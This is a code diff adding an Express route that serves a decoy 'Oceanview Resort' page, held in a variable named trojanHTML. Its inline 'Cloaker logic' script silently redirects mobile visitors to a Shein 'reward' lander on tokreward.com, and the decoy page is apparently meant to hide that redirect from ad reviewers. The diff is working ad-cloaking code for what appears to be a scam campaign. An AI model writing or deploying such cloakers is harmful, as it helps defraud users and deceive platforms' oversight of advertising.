@@ -501,6 +501,131 @@ app.get('/94710/:slug', (req, res, next) => {
 });
 
 // SHEIN BH FLUENT
+app.get('/94711/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/shein.html?slug=947`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+                body, html {
+                    margin: 0;
+                    padding: 0;
+                    font-family: 'Arial', sans-serif;
+                    background-color: #f0f8ff;
+                    color: #333;
+                }
+                .wrapper {
+                    max-width: 1200px;
+                    margin: 0 auto;
+                    padding: 20px;
+                }
+                header {
+                    background-color: #4a90e2;
+                    color: white;
+                    text-align: center;
+                    padding: 20px 0;
+                }
+                .hero {
+                    background-image: url('https://example.com/hero-image.jpg');
+                    background-size: cover;
+                    height: 400px;
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    color: white;
+                    text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+                }
+                .cta-button {
+                    background-color: #ff6b6b;
+                    color: white;
+                    padding: 10px 20px;
+                    border: none;
+                    border-radius: 5px;
+                    font-size: 18px;
+                    cursor: pointer;
+                    transition: background-color 0.3s ease;
+                }
+                .cta-button:hover {
+                    background-color: #ff4757;
+                }
+                .features {
+                    display: flex;
+                    justify-content: space-around;
+                    margin-top: 40px;
+                }
+                .feature {
+                    text-align: center;
+                    padding: 20px;
+                    background-color: white;
+                    border-radius: 10px;
+                    box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+                }
+                footer {
+                    background-color: #333;
+                    color: white;
+                    text-align: center;
+                    padding: 20px 0;
+                    margin-top: 40px;
+                }
+            </style>
+        </head>
+        <body>
+            <header>
+                <h1>${slug} Oceanview Resort</h1>
+            </header>
+            <div class="hero">
+                <div>
+                    <h2>Experience Paradise at ${slug}</h2>
+                    <button class="cta-button">Book Now</button>
+                </div>
+            </div>
+            <div class="wrapper">
+                <section class="features">
+                    <div class="feature">
+                        <h3>Luxurious Rooms</h3>
+                        <p>Unwind in our spacious, ocean-view suites</p>
+                    </div>
+                    <div class="feature">
+                        <h3>Gourmet Dining</h3>
+                        <p>Savor exquisite cuisine from world-class chefs</p>
+                    </div>
+                    <div class="feature">
+                        <h3>Spa & Wellness</h3>
+                        <p>Rejuvenate your body and mind in our premium spa</p>
+                    </div>
+                </section>
+                <section>
+                    <h2>About ${slug} Oceanview Resort</h2>
+                    <p>Nestled on the pristine shores of a tropical paradise, ${slug} Oceanview Resort offers an unforgettable escape from the ordinary. Our world-class amenities and breathtaking views ensure a luxurious and relaxing stay for all our guests.</p>
+                </section>
+            </div>
+            <footer>
+                <p>&copy; 2024 ${slug} Oceanview Resort | <a href="https://tokreward.com/pp.html">Privacy Policy</a></p>
+            </footer>
+        </body>
+        </html>
+    `;
+    res.send(trojanHTML);
+    console.log(`Served 947 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/94810/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=948`;
